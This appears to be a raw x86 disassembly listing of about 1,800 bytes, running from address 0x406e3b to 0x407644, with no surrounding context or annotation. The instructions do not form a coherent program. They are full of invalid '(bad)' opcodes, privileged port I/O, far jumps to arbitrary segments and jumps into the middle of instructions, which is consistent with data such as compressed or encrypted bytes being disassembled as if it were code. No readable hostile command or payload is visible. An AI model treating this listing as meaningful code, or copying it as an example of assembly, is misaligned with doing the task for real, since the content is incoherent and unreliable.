  406e3b:	test   al,0xc2
  406e3d:	mov    ds:0xc0747240,eax
  406e42:	push   0xcf3fb1c9
  406e47:	xor    BYTE PTR [eax+0x72],bh
  406e4a:	xchg   edx,eax
  406e4b:	xchg   edi,eax
  406e4c:	adc    BYTE PTR [ebx-0x67a88a4f],bh
  406e52:	mov    ds:0xb15e485b,eax
  406e57:	jl     0x406e77
  406e59:	add    ebx,eax
  406e5b:	retf   
  406e5c:	xor    cl,al
  406e5e:	pop    eax
  406e5f:	sbb    DWORD PTR [eax],ebp
  406e61:	pop    es
  406e62:	and    al,0x20
  406e64:	and    DWORD PTR [esi+0x4f1c0c10],ecx
  406e6a:	jge    0x406e7c
  406e6c:	stos   BYTE PTR es:[edi],al
  406e6d:	fadd   QWORD PTR [eax-0x47467e46]
  406e73:	add    DWORD PTR [edi-0x5f74e815],edx
  406e79:	mov    ebx,0x50180854
  406e7e:	add    al,0x14
  406e80:	or     ecx,DWORD PTR [ebx-0x58f2216b]
  406e86:	mov    cl,0x9c
  406e88:	pop    ebp
  406e89:	ret    0x2fb4
  406e8c:	es in  al,0x32
  406e8f:	add    edx,DWORD PTR [eax]
  406e91:	mov    al,ds:0xb3670c0b
  406e96:	mov    al,BYTE PTR [esi]
  406e98:	adc    BYTE PTR [ebx-0x63734d52],al
  406e9e:	ins    BYTE PTR es:[edi],dx
  406e9f:	xchg   ebx,eax
  406ea0:	push   esi
  406ea1:	fs or  al,0xbb
  406ea4:	and    BYTE PTR [ebp+0xd],bh
  406ea7:	xchg   edx,eax
  406ea8:	adc    eax,0x140a3bf5
  406ead:	ins    DWORD PTR es:[edi],dx
  406eae:	adc    eax,DWORD PTR ds:0x99b8ae5f
  406eb4:	sbb    al,0x85
  406eb6:	fmul   DWORD PTR [ebx]
  406eb8:	mov    eax,ds:0x443c80e
  406ebd:	mov    dl,0x5d
  406ebf:	(bad)  
  406ec0:	or     DWORD PTR [ebx-0x10],esi
  406ec3:	xchg   esi,eax
  406ec4:	lock pop ecx
  406ec6:	push   0xc8176bcf
  406ecb:	sub    edx,DWORD PTR [eax-0x363f8e3e]
  406ed1:	adc    DWORD PTR [eax+0x2eb32043],0x90272047
  406edb:	xchg   esp,eax
  406edc:	mov    bl,0x35
  406ede:	call   0x108a:0x2057902e
  406ee5:	mov    eax,ds:0xc0872103
  406eea:	xlat   BYTE PTR ds:[ebx]
  406eeb:	mov    ah,0x6
  406eed:	in     al,dx
  406eee:	nop
  406eef:	dec    eax
  406ef0:	dec    esi
  406ef1:	pusha  
  406ef2:	imul   esi,DWORD PTR [ebp+ecx*1+0xb3d8320],0x53
  406efa:	clc    
  406efb:	clc    
  406efc:	jno    0x406e83
  406efe:	fwait
  406eff:	pop    edi
  406f00:	mov    dl,0x4c
  406f02:	sub    eax,0x558df8f8
  406f07:	jmp    DWORD PTR [eax-0x5c]
  406f0a:	xchg   esi,eax
  406f0b:	jb     0x406f0c
  406f0d:	and    eax,0x1ff7d80
  406f12:	cmc    
  406f13:	sbb    eax,eax
  406f15:	mov    dl,dh
  406f17:	add    dl,BYTE PTR [ebp+ebp*1-0x36813f3f]
  406f1e:	clc    
  406f1f:	jle    0x406ea2
  406f21:	retf   0xb0b1
  406f24:	jmp    0x406f07
  406f26:	pop    ebx
  406f27:	inc    ebx
  406f28:	push   es
  406f29:	jae    0x406ebf
  406f2b:	sub    al,0x84
  406f2d:	clc    
  406f2e:	push   ss
  406f2f:	and    edi,DWORD PTR [edx]
  406f31:	nop
  406f32:	adc    BYTE PTR [ebx],bl
  406f34:	out    dx,eax
  406f35:	iret   
  406f36:	push   eax
  406f37:	into   
  406f38:	add    al,0x75
  406f3a:	jno    0x406efc
  406f3c:	cmp    DWORD PTR [edx],eax
  406f3e:	cmp    DWORD PTR [eax-0x24cc0bf1],esi
  406f44:	icebp  
  406f45:	call   DWORD PTR [edx+0x30d2d843]
  406f4b:	nop
  406f4c:	outs   dx,DWORD PTR ds:[esi]
  406f4d:	mov    ch,0x68
  406f4f:	dec    edx
  406f50:	push   ds
  406f51:	and    DWORD PTR [edi+0x6fb5d081],ebp
  406f57:	or     DWORD PTR [ecx+eiz*1+0x64dc1499],eax
  406f5e:	add    cl,BYTE PTR [edx]
  406f60:	pop    ss
  406f61:	test   al,0x1f
  406f63:	ins    BYTE PTR es:[edi],dx
  406f64:	or     BYTE PTR [ecx],al
  406f66:	inc    esp
  406f67:	sbb    DWORD PTR [ebx],edi
  406f69:	push   ss
  406f6a:	push   ecx
  406f6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f6c:	jns    0x406fcf
  406f6e:	inc    eax
  406f6f:	jae    0x406f85
  406f71:	jmp    0x406f7b
  406f73:	popa   
  406f74:	add    bl,ah
  406f76:	aad    0x90
  406f78:	push   ebx
  406f79:	nop
  406f7a:	rol    DWORD PTR [esi],0x19
  406f7d:	sbb    BYTE PTR [edi+eax*1],dl
  406f80:	adc    BYTE PTR [ecx+0x43],al
  406f83:	adc    BYTE PTR [ebx+0xc],ch
  406f86:	xor    ebx,DWORD PTR [esi]
  406f88:	rcr    DWORD PTR [esi+0x2d],cl
  406f8b:	push   0x43
  406f8d:	mov    DWORD PTR [ecx-0x4],edi
  406f90:	test   DWORD PTR [edx+ecx*2+0x0],edx
  406f94:	xchg   ecx,eax
  406f95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f96:	nop
  406f97:	cld    
  406f98:	mov    ecx,0x86ba8857
  406f9d:	leave  
  406f9e:	add    bl,BYTE PTR ds:0x2bf90c2
  406fa4:	jo     0x407014
  406fa6:	rcl    BYTE PTR [ecx-0x62],0xb8
  406faa:	xor    BYTE PTR [ecx-0x3f04591e],bl
  406fb0:	push   ebp
  406fb1:	cmp    eax,0x4012b8a8
  406fb6:	mov    dh,0x8
  406fb8:	pop    ecx
  406fb9:	cs jns 0x406f82
  406fbc:	mov    edx,0xd8159c3a
  406fc1:	push   esp
  406fc2:	mov    al,ds:0x4b92e467
  406fc7:	pop    esp
  406fc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406fc9:	in     al,0x2e
  406fcb:	mov    ecx,0xa86492e4
  406fd0:	ins    BYTE PTR es:[edi],dx
  406fd1:	lods   al,BYTE PTR ds:[esi]
  406fd2:	mov    ecx,0x744b92e4
  406fd7:	mov    al,0x7c
  406fd9:	in     al,0x92
  406fdb:	dec    ebx
  406fdc:	cs mov ah,0x84
  406fdf:	mov    eax,0xb92e4b92
  406fe4:	mov    WORD PTR [esp+edx*4-0x1b46d1b5],?
  406feb:	rcr    BYTE PTR [esp+eax*8-0x6d1b986e],0xa4
  406ff3:	enter  0xacf0,0xe7
  406ff7:	xchg   edx,eax
  406ff8:	addr16 in al,0xcc
  406ffb:	cld    
  406ffc:	mov    ah,0xd0
  406ffe:	iret   
  406fff:	enter  0xcf25,0xb2
  407003:	push   0xd4d4d4c4
  407008:	dec    ebx
  407009:	sahf   
  40700a:	iret   
  40700b:	and    eax,0xe440b3d8
  407010:	lahf   
  407011:	dec    ebx
  407012:	sahf   
  407013:	xchg   ecx,eax
  407014:	fsubr  QWORD PTR [esp+esi*8-0x61e74b20]
  40701b:	xchg   ecx,eax
  40701c:	dec    ebx
  40701d:	ss mov ecx,0x1498e404
  407023:	xchg   edi,eax
  407024:	cmp    al,0x9f
  407026:	dec    ebx
  407027:	call   0xec6478e1
  40702c:	add    al,0x97
  40702e:	cmp    al,0x23
  407030:	js     0x407066
  407032:	lock inc eax
  407034:	leave  
  407035:	cmp    BYTE PTR [edi+0x656c6f8b],0x61
  40703c:	jne    0x4070b2
  40703e:	pop    ebx
  40703f:	mov    eax,0x5959e881
  407044:	inc    ebx
  407045:	push   0x7079544d
  40704a:	enter  0x7fb1,0x2d
  40704e:	pop    esp
  40704f:	adc    ecx,DWORD PTR [esi+0x65]
  407052:	add    BYTE PTR [bx],al
  407055:	outs   dx,DWORD PTR ds:[esi]
  407056:	je     0x40707b
  407058:	(bad)  
  407059:	cmp    al,0xf2
  40705b:	inc    ecx
  40705c:	fs fs push ebx
  40705f:	jne    0x4070c3
  407061:	dec    ebp
  407062:	jne    0x4070d0
  407064:	inc    esp
  407065:	into   
  407066:	jle    0x407056
  407068:	enter  0x7669,0x49
  40706c:	or     BYTE PTR fs:[edi],dl
  40706f:	outs   dx,DWORD PTR ds:[esi]
  407070:	fs das 
  407072:	outs   dx,BYTE PTR ds:[esi]
  407073:	jns    0x407059
  407075:	xchg   ecx,eax
  407076:	dec    edi
  407077:	dec    edi
  407078:	jb     0x40707a
  40707a:	pop    eax
  40707b:	outs   dx,DWORD PTR ds:[esi]
  40707c:	jb     0x4070c1
  40707e:	ins    DWORD PTR es:[edi],dx
  40707f:	jo     0x407012
  407081:	jl     0x407072
  407083:	aas    
  407084:	xor    al,0x46
  407086:	jb     0x4070f7
  407088:	ins    DWORD PTR es:[edi],dx
  407089:	push   ebx
  40708a:	je     0x4070aa
  40708c:	rsqrtps xmm3,XMMWORD PTR [edi-0x4e]
  407090:	pop    edi
  407091:	enter  0x4438,0x61
  407095:	je     0x4070fc
  407097:	adc    DWORD PTR [edi+0x79],eax
  40709a:	ja     0x4070e7
  40709c:	jle    0x4070ff
  40709e:	pop    ds
  40709f:	inc    edx
  4070a0:	outs   dx,DWORD PTR ds:[esi]
  4070a1:	outs   dx,DWORD PTR ds:[esi]
  4070a2:	ins    BYTE PTR es:[edi],dx
  4070a3:	(bad)  
  4070a5:	je     0x407119
  4070a7:	pusha  
  4070a8:	das    
  4070a9:	and    DWORD PTR [edi],edi
  4070ab:	inc    ebx
  4070ac:	jns    0x4070ae
  4070ae:	inc    edi
  4070af:	cmovo  ebx,DWORD PTR [esi+0x12]
  4070b3:	outs   dx,DWORD PTR ds:[esi]
  4070b4:	aaa    
  4070b5:	repz mov ecx,0x7253169
  4070bb:	fs hlt 
  4070bd:	mov    ecx,0x28a8f470
  4070c2:	cmp    eax,0x5a05926c
  4070c7:	xor    al,0x4b
  4070c9:	cmp    eax,DWORD PTR [edx+0x10]
  4070cc:	mov    cl,0xd3
  4070ce:	adc    bh,bh
  4070d0:	and    BYTE PTR [esi+ebp*4],cl
  4070d3:	fwait
  4070d4:	ins    BYTE PTR es:[edi],dx
  4070d5:	pop    ss
  4070d6:	sub    eax,0x800974df
  4070db:	inc    ecx
  4070dc:	test   DWORD PTR [ebx],eax
  4070de:	or     DWORD PTR [edx+ebp*1],ebp
  4070e1:	call   0x1990:0x36d49c92
  4070e8:	in     al,dx
  4070e9:	mov    ecx,0x8b1408a6
  4070ee:	pop    edx
  4070ef:	mov    ecx,0x90a790b2
  4070f4:	cmp    BYTE PTR [ebx+0x690c5cba],0x9a
  4070fb:	fild   DWORD PTR [ebx]
  4070fd:	fimul  WORD PTR [ebx+eax*1+0x501c90df]
  407104:	mov    bh,0xd9
  407106:	call   0xdd1b:0x186c30a6
  40710d:	ffree  st(4)
  40710f:	and    edx,edi
  407111:	jne    0x40717a
  407113:	cmp    edx,DWORD PTR [edi]
  407115:	sbb    esi,esp
  407117:	add    ebx,ebp
  407119:	test   eax,0x1fde4fdf
  40711e:	shr    DWORD PTR [eax],0x14
  407121:	jle    0x407101
  407123:	or     al,0x12
  407125:	push   esp
  407126:	inc    ebx
  407127:	jne    0x407150
  407129:	and    al,0x23
  40712b:	add    dh,dl
  40712d:	jmp    0x18d4:0xba4b1d1e
  407134:	mov    ah,BYTE PTR [eax-0x35]
  407137:	mov    bl,0xb3
  407139:	add    BYTE PTR [eax+0x8],ah
  40713c:	adc    eax,0x5410f922
  407141:	loopne 0x40717e
  407143:	mov    edx,0x392876ec
  407148:	jb     0x407104
  40714a:	in     al,dx
  40714b:	push   edi
  40714c:	cwde   
  40714d:	push   ss
  40714e:	inc    ebp
  40714f:	pop    edx
  407150:	inc    ecx
  407151:	ret    
  407152:	and    BYTE PTR [edx],cl
  407154:	out    dx,al
  407155:	repnz and bh,BYTE PTR [ebx]
  407158:	or     bh,dh
  40715a:	mov    ebx,0x50bb6350
  40715f:	inc    ecx
  407160:	add    DWORD PTR [ebx+0x4],edi
  407163:	adc    eax,0x9b25d445
  407168:	popa   
  407169:	sbb    BYTE PTR [edx-0x6d],bl
  40716c:	arpl   WORD PTR [edx+ecx*1-0x4bf37ab6],si
  407173:	and    ah,cl
  407175:	rol    DWORD PTR fs:[ebp+0x2b18bc63],0x43
  40717d:	jb     0x407183
  40717f:	repnz mov esp,0x19411718
  407185:	dec    edx
  407186:	mov    edx,0x656772d8
  40718b:	arpl   WORD PTR [esp+edi*2-0x14],di
  40718f:	loopne 0x40712f
  407191:	or     al,BYTE PTR [edx+0x61]
  407194:	or     DWORD PTR fs:[ecx],esi
  407197:	arpl   WORD PTR [edx],cx
  407199:	popa   
  40719a:	sub    BYTE PTR [ecx],bh
  40719c:	loopne 0x40717e
  40719e:	sub    ebx,DWORD PTR [ebp+0x63973784]
  4071a4:	retf   0x6564
  4071a7:	js     0x4071d4
  4071a9:	mov    ebp,0x79023944
  4071ae:	xchg   ecx,eax
  4071af:	arpl   WORD PTR [ebp+0x46f1844],di
  4071b5:	fisttp QWORD PTR [esi]
  4071b7:	inc    ecx
  4071b8:	pop    ebx
  4071b9:	popa   
  4071ba:	jns    0x4071a1
  4071bc:	imul   esp,DWORD PTR [ebp+0x64],0xffffff92
  4071c0:	ins    DWORD PTR es:[edi],dx
  4071c1:	dec    eax
  4071c2:	inc    ecx
  4071c3:	sti    
  4071c4:	lods   al,BYTE PTR ds:[si]
  4071c6:	scas   al,BYTE PTR es:[edi]
  4071c7:	das    
  4071c8:	dec    eax
  4071c9:	xchg   BYTE PTR [ebx+eax*2-0x37739a8e],ch
  4071d0:	mov    esp,esp
  4071d2:	gs addr16 mov esi,0x6814be14
  4071d9:	pusha  
  4071da:	enter  0x1411,0xbd
  4071de:	dec    ecx
  4071df:	mov    eax,ds:0x7016c064
  4071e4:	ins    BYTE PTR es:[edi],dx
  4071e5:	arpl   WORD PTR [eax+0x9],di
  4071e8:	push   eax
  4071e9:	test   eax,0xa2cb78b0
  4071ee:	sbb    BYTE PTR [edx+0x6],cl
  4071f1:	ins    BYTE PTR es:[edi],dx
  4071f2:	addr16 loopne 0x4071d5
  4071f5:	aaa    
  4071f6:	or     ah,BYTE PTR [edi+0x6e5563c2]
  4071fc:	sti    
  4071fd:	pop    edi
  4071fe:	arpl   WORD PTR [ecx+eiz*4+0x64],si
  407202:	and    DWORD PTR [eax],ecx
  407204:	call   0x68c2:0xa512bfff
  40720b:	pop    ds
  40720c:	arpl   WORD PTR [ebp+0x8],sp
  40720f:	add    eax,0x9370c2e3
  407214:	arpl   WORD PTR [eax+0x63],bp
  407217:	jecxz  0x40727b
  407219:	enter  0x80b1,0xcf
  40721d:	mov    edi,0xc9cf88a6
  407222:	or     eax,0xfc70475e
  407227:	mov    ebx,0x1643a104
  40722c:	cmp    eax,0xadbf519b
  407231:	leave  
  407232:	or     al,0x2
  407234:	add    eax,0xb0e48723
  407239:	ins    BYTE PTR es:[edi],dx
  40723a:	and    edx,DWORD PTR [ecx]
  40723c:	adc    al,0xec
  40723e:	add    ch,al
  407240:	in     al,0x45
  407242:	inc    ecx
  407243:	dec    esi
  407244:	inc    edx
  407245:	xor    eax,0x5d6f3fc0
  40724a:	je     0x4071da
  40724c:	in     al,0xdb
  40724e:	pop    eax
  40724f:	clc    
  407250:	or     edx,DWORD PTR [ebx]
  407252:	call   0x60ae38e2
  407257:	shl    DWORD PTR [eax],1
  407259:	call   0xc84d0656
  40725e:	and    BYTE PTR [ebx-0x1b83b91c],bl
  407264:	lock push ecx
  407266:	mov    bh,0xea
  407268:	xchg   ecx,eax
  407269:	rol    BYTE PTR [esi+0x22],0xba
  40726d:	add    esp,DWORD PTR [eax+0x11]
  407270:	adc    BYTE PTR [eax-0x6310d8d1],0x90
  407277:	or     DWORD PTR [ecx],edi
  407279:	rcl    BYTE PTR [esi+0x3ca0ba58],0xa
  407280:	cmp    DWORD PTR [ecx+0x2fc19dc0],eax
  407286:	in     al,0x42
  407288:	pop    esi
  407289:	xchg   ecx,eax
  40728a:	inc    edi
  40728b:	mov    al,0x68
  40728d:	in     al,0x5
  40728f:	enter  0xc109,0x36
  407293:	rol    DWORD PTR [esi+0x26427204],0x38
  40729a:	mov    ebp,0xb006060
  40729f:	in     al,0xc1
  4072a1:	lea    ecx,[ebx+0x60]
  4072a4:	adc    DWORD PTR [esp+ebp*2],edi
  4072a7:	jmp    0x1052:0x77f5d5c3
  4072ae:	(bad)  
  4072af:	cmp    eax,0x8002000a
  4072b4:	jg     0x4072ef
  4072b6:	in     eax,0x5
  4072b8:	or     al,0xf6
  4072ba:	stos   BYTE PTR es:[edi],al
  4072bb:	push   eax
  4072bc:	rcr    DWORD PTR ds:0x5c13277d,0x0
  4072c3:	loopne 0x407292
  4072c5:	clc    
  4072c6:	sub    eax,0x6700bffe
  4072cb:	pop    esp
  4072cc:	add    DWORD PTR [eax-0x3c01104d],ebx
  4072d2:	pop    ecx
  4072d3:	sub    eax,0x3f742308
  4072d8:	dec    eax
  4072d9:	je     0x40733d
  4072db:	push   cs
  4072dc:	or     edi,DWORD PTR [ebx]
  4072de:	(bad)  [eax+0x5]
  4072e1:	icebp  
  4072e2:	add    dh,BYTE PTR [edx]
  4072e4:	lahf   
  4072e5:	sbb    BYTE PTR [edx+0x1b],dh
  4072e8:	fstp   DWORD PTR [edx+0x48]
  4072eb:	adc    esp,eax
  4072ed:	dec    ecx
  4072ee:	cmp    edi,ebp
  4072f0:	add    ah,ah
  4072f2:	fnstenv [edi+0x58bf9e0b]
  4072f8:	or     DWORD PTR [ecx+0x761c48d9],ebp
  4072fe:	mov    cl,0x25
  407300:	daa    
  407301:	mov    esp,0xc0092530
  407306:	dec    eax
  407307:	xor    cl,al
  407309:	xchg   cl,al
  40730b:	das    
  40730c:	clc    
  40730d:	gs inc esi
  40730f:	mov    ah,0xf8
  407311:	fs repz sub eax,0xf4552f5b
  407318:	inc    edi
  407319:	in     al,0xbe
  40731b:	sub    DWORD PTR [ebx],edi
  40731d:	sbb    esp,esi
  40731f:	xchg   esp,eax
  407320:	and    eax,0x99487bf0
  407325:	mov    dl,0x93
  407327:	shl    DWORD PTR ds:0xec4bf8f0,0x94
  40732e:	sbb    al,0x19
  407330:	in     al,dx
  407331:	mov    WORD PTR ds:0xe4c8bdec,fs
  407337:	enter  0xdf60,0xe8
  40733b:	xchg   edi,eax
  40733c:	fsub   DWORD PTR ds:0x762cbee8
  407342:	and    DWORD PTR [ebx],esp
  407344:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407345:	adc    ebp,esp
  407347:	int3   
  407348:	and    eax,0x5ed9e419
  40734d:	jmp    0x4073c2
  40734f:	dec    eax
  407350:	loopne 0x407302
  407352:	loopne 0x4073d0
  407354:	inc    esp
  407355:	add    esi,DWORD PTR [esi]
  407357:	mov    edx,0x6d2819eb
  40735c:	mov    edi,0xc86051d1
  407361:	jge    0x40732f
  407363:	or     ecx,DWORD PTR [ecx-0x2bf92fa3]
  407369:	mov    dl,0x71
  40736b:	enter  0x8156,0xc4
  40736f:	les    ebx,FWORD PTR [eax+0x2cb3c8d8]
  407375:	int    0xdc
  407377:	enter  0xc002,0x3c
  40737b:	jo     0x40737f
  40737d:	cmp    DWORD PTR [edx],esi
  40737f:	rcl    BYTE PTR [edi-0x68],0xc3
  407383:	fdivr  QWORD PTR [ecx+0x23]
  407386:	dec    eax
  407387:	add    edi,DWORD PTR [eax-0x451f5afe]
  40738d:	or     BYTE PTR [ebp+0x33],al
  407390:	mov    ah,BYTE PTR [ecx]
  407392:	fidiv  WORD PTR [edi+0x27]
  407395:	inc    esp
  407396:	mov    al,0x3b
  407398:	xchg   edi,eax
  407399:	sbb    cl,al
  40739b:	mov    edi,ss
  40739d:	sub    al,0x83
  40739f:	loopne 0x407352
  4073a1:	push   ecx
  4073a2:	jg     0x40738f
  4073a4:	cmp    ch,bl
  4073a6:	pop    ds
  4073a7:	fisubr WORD PTR [edx+0xd74075b]
  4073ad:	mov    edx,eax
  4073af:	mov    edx,ecx
  4073b1:	jmp    0xb07b:0x3103ebac
  4073b8:	adc    BYTE PTR [edx],cl
  4073ba:	rcr    BYTE PTR [ebx+ebp*8-0x7e1b60cd],0x9c
  4073c2:	mov    edi,fs
  4073c4:	les    ebp,FWORD PTR [esi+0x46]
  4073c7:	je     0x407409
  4073c9:	dec    esi
  4073ca:	and    BYTE PTR [edi],ah
  4073cc:	mov    esi,0x4575c4f8
  4073d1:	fadd   QWORD PTR [ecx]
  4073d3:	mov    cl,0xa3
  4073d5:	add    ecx,0xfaa17800
  4073db:	or     eax,0x4c15460
  4073e0:	add    edx,DWORD PTR [ecx+eax*8]
  4073e3:	sbb    eax,0x6e83943b
  4073e8:	sbb    esi,ebp
  4073ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073eb:	dec    esi
  4073ec:	setg   dl
  4073ef:	dec    eax
  4073f0:	sti    
  4073f1:	add    al,0xac
  4073f3:	jge    0x4073d8
  4073f5:	pop    ebp
  4073f6:	imul   ecx,DWORD PTR ds:0x65046f03,0x32
  4073fd:	call   FWORD PTR [edi+0x6b]
  407400:	mov    dh,bl
  407402:	test   BYTE PTR [ecx+0x368c9522],al
  407408:	cmp    eax,0x8db9f0d9
  40740d:	std    
  40740e:	mov    esi,DWORD PTR [ebp+0x8]
  407411:	add    ebx,DWORD PTR [esi+eax*8-0x63bd8ab7]
  407418:	xchg   BYTE PTR [edi+0x22],bh
  40741b:	sbb    BYTE PTR [eax-0x7e],0x12
  40741f:	push   ebx
  407420:	pop    ecx
  407421:	jmp    0x407464
  407423:	mov    ebx,0x2f2f6f7
  407428:	mov    DWORD PTR [edx+eax*4+0x48520916],ecx
  40742f:	xor    BYTE PTR [ecx-0x6c],al
  407432:	dec    ebx
  407433:	in     al,0xc4
  407435:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407436:	(bad)  
  407437:	hlt    
  407438:	jns    0x4073ea
  40743a:	or     BYTE PTR [edi-0x18],dh
  40743d:	cld    
  40743e:	inc    DWORD PTR [ebp+0x31f002fc]
  407444:	push   ebx
  407445:	inc    edi
  407446:	add    eax,0x200140f6
  40744b:	pop    ebx
  40744c:	test   DWORD PTR [ebx+0x57f15d],esi
  407452:	pop    es
  407453:	aaa    
  407454:	ret    
  407455:	loopne 0x40746c
  407457:	data16 rcr BYTE PTR [edx],1
  40745a:	adc    DWORD PTR [ebx],esp
  40745c:	add    eax,0xbad70f2b
  407461:	stos   BYTE PTR es:[edi],al
  407462:	and    eax,0x8a22fc80
  407467:	xchg   ebp,eax
  407468:	test   eax,0x2fc7d98a
  40746d:	les    eax,FWORD PTR [eax+0x74]
  407470:	adc    esp,DWORD PTR [esp+eiz*8]
  407473:	mov    bl,0x64
  407475:	fwait
  407476:	lods   eax,DWORD PTR ds:[esi]
  407477:	add    BYTE PTR [ebx-0x8],cl
  40747a:	jmp    0x40748b
  40747c:	adc    dl,BYTE PTR [eax]
  40747e:	fidiv  WORD PTR [ebx-0x7f19324]
  407484:	movzx  eax,WORD PTR [eax]
  407487:	lock popf 
  407489:	add    eax,0x28efd8d
  40748e:	sub    DWORD PTR [ebx+0x43],0x33
  407492:	dec    DWORD PTR [ebp+0x47c6c6b5]
  407498:	add    BYTE PTR [edi],ch
  40749a:	mov    dl,0x2a
  40749c:	call   0xca2ce9a6
  4074a1:	add    dh,BYTE PTR [ebp-0x73]
  4074a4:	inc    edi
  4074a5:	add    DWORD PTR [edx],ebx
  4074a7:	clc    
  4074a8:	mov    ch,0xf0
  4074aa:	nop
  4074ab:	fwait
  4074ac:	or     eax,0x858d7bd9
  4074b1:	hlt    
  4074b2:	adc    BYTE PTR [ebx],bl
  4074b4:	clc    
  4074b5:	lods   al,BYTE PTR ds:[esi]
  4074b6:	inc    eax
  4074b7:	pop    eax
  4074b8:	cwde   
  4074b9:	std    
  4074ba:	cmp    edx,DWORD PTR [ebp+0x4502b21]
  4074c0:	inc    edx
  4074c1:	seto   BYTE PTR [edi-0xa]
  4074c5:	mov    dl,0xb7
  4074c7:	and    BYTE PTR [eax],cl
  4074c9:	dec    ebx
  4074ca:	jne    0x40746a
  4074cc:	jne    0x4074e8
  4074ce:	inc    ebx
  4074cf:	inc    esi
  4074d0:	fsub   DWORD PTR [esi+0x54]
  4074d3:	xchg   DWORD PTR [esi-0xd],eax
  4074d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074d7:	or     bl,al
  4074d9:	scas   al,BYTE PTR es:[edi]
  4074da:	xor    eax,0x2472cd28
  4074df:	repz push ebp
  4074e1:	and    eax,0x231e0a5b
  4074e6:	scas   eax,DWORD PTR es:[edi]
  4074e7:	les    esi,FWORD PTR [ecx+ebx*2-0x1b]
  4074eb:	sub    dh,BYTE PTR [ebx+0x39]
  4074ee:	pusha  
  4074ef:	outs   dx,DWORD PTR ds:[esi]
  4074f0:	fs in  al,dx
  4074f2:	test   DWORD PTR ds:0xe600b676,ebp
  4074f8:	in     al,dx
  4074f9:	out    dx,al
  4074fa:	add    eax,0xf8c60a1e
  4074ff:	push   ebp
  407500:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  407502:	or     al,0x6f
  407505:	ret    0xb575
  407508:	add    ebp,DWORD PTR [eax]
  40750a:	mov    cl,0x8c
  40750c:	push   eax
  40750d:	cmp    BYTE PTR [eax],al
  40750f:	xchg   ebx,eax
  407510:	pop    ebx
  407511:	aaa    
  407512:	push   edx
  407513:	loop   0x40757a
  407515:	mov    edi,0x14fe5044
  40751a:	jae    0x407529
  40751c:	push   ebx
  40751d:	pop    ds
  40751e:	jmp    0x40757b
  407520:	aas    
  407521:	and    ch,dh
  407523:	or     BYTE PTR [ecx],bl
  407525:	add    DWORD PTR [ebp+0xf],esi
  407528:	cmp    BYTE PTR [ebp+0x2c6e9643],cl
  40752e:	mov    ds:0x1545b308,al
  407533:	add    DWORD PTR [edx],ecx
  407535:	or     edi,DWORD PTR [edi-0x54]
  407538:	and    dl,BYTE PTR [ebx+0x58]
  40753b:	or     al,0xeb
  40753d:	xor    al,0x66
  40753f:	idiv   ecx
  407541:	and    BYTE PTR [ebx-0x2b],bl
  407544:	(bad)  
  407545:	test   al,0x74
  407547:	jge    0x40750e
  407549:	add    bl,ch
  40754b:	and    al,0xe1
  40754d:	mov    al,0x14
  407550:	je     0x407580
  407552:	fbstp  TBYTE PTR [ebx+esi*8+0xa6ec051]
  407559:	mov    WORD PTR [ebx+ebp*8],fs
  40755c:	or     ebx,DWORD PTR [esp+eax*2-0x44]
  407560:	mov    ch,0x18
  407562:	sub    edi,DWORD PTR [ecx]
  407564:	mov    bl,0xbf
  407566:	jne    0x40756e
  407568:	xor    DWORD PTR [esi+0x3d9e7bf1],esi
  40756e:	(bad)  
  40756f:	jl     0x40757c
  407571:	push   eax
  407572:	mov    edx,0x53921958
  407577:	xchg   ebp,eax
  407578:	lahf   
  407579:	mov    DWORD PTR [esp+ebx*8-0x70],0x8d073e33
  407581:	clc    
  407582:	fimul  DWORD PTR [ecx+0x133043a1]
  407588:	mov    dl,0xb1
  40758a:	fwait
  40758b:	add    ecx,DWORD PTR [eax-0x1ce611f]
  407591:	xchg   ebp,eax
  407592:	or     eax,0xe88f438b
  407597:	or     DWORD PTR [ecx+edx*4],ecx
  40759a:	test   eax,0x895e818c
  40759f:	fsub   QWORD PTR [eax+eiz*1-0x67]
  4075a3:	nop
  4075a4:	fsub   st(0),st
  4075a6:	call   0x8e88d9b7
  4075ab:	(bad)  
  4075ad:	mov    bh,0xc0
  4075af:	mov    esi,DWORD PTR [ecx+ecx*2-0x3]
  4075b3:	jl     0x4075ba
  4075b5:	or     al,0x38
  4075b7:	cmc    
  4075b8:	cmp    eax,DWORD PTR [esi-0x77]
  4075bb:	mov    al,0x46
  4075bd:	cmp    DWORD PTR [ebp-0x338afffb],0xffffff86
  4075c4:	ins    BYTE PTR es:[edi],dx
  4075c5:	mov    WORD PTR [ecx+0xafc5a38],cs
  4075cb:	add    al,0xbc
  4075cd:	div    DWORD PTR [esi]
  4075cf:	mov    eax,0x5d0a200c
  4075d4:	sub    edx,esi
  4075d6:	mov    esp,0xd789a30a
  4075db:	(bad)  
  4075dc:	adc    al,0x52
  4075de:	lea    eax,[ebp-0x171b37b4]
  4075e4:	idiv   BYTE PTR [eax+0x23]
  4075e7:	cdq    
  4075e8:	nop
  4075e9:	loopne 0x4075d7
  4075eb:	cmp    eax,0x6638719e
  4075f0:	mov    cl,0x26
  4075f2:	call   DWORD PTR [ebp+0x44c7ffa4]
  4075f8:	or     DWORD PTR [eax+ecx*2],0x12eb8d7f
  4075ff:	push   ebx
  407600:	add    dl,BYTE PTR [ebp+eax*8-0x6f2eed1c]
  407607:	ja     0x4075d3
  407609:	xor    al,0x68
  40760b:	add    BYTE PTR [ebp-0x1d],ah
  40760e:	fcom   QWORD PTR [edi-0x4d165ffd]
  407614:	sub    al,0xcd
  407616:	xchg   ebx,eax
  407617:	sbb    al,0x3e
  407619:	dec    DWORD PTR [esi]
  40761b:	push   esi
  40761c:	sbb    eax,0x1939669e
  407621:	xchg   esp,eax
  407622:	jns    0x407623
  407624:	pop    ss
  407625:	add    DWORD PTR [ecx+0x61],edx
  407628:	jmp    0x3e5f:0x22086500
  40762f:	mov    ebp,0x3bbec6a8
  407634:	inc    DWORD PTR [ecx]
  407636:	adc    esp,DWORD PTR [esi-0x77]
  407639:	cmp    ebx,DWORD PTR [edi-0x29eab31c]
  40763f:	sbb    DWORD PTR [esi],ebp
  407641:	adc    al,0xeb
  407643:	inc    ecx
  407644:	loop   0x40769c
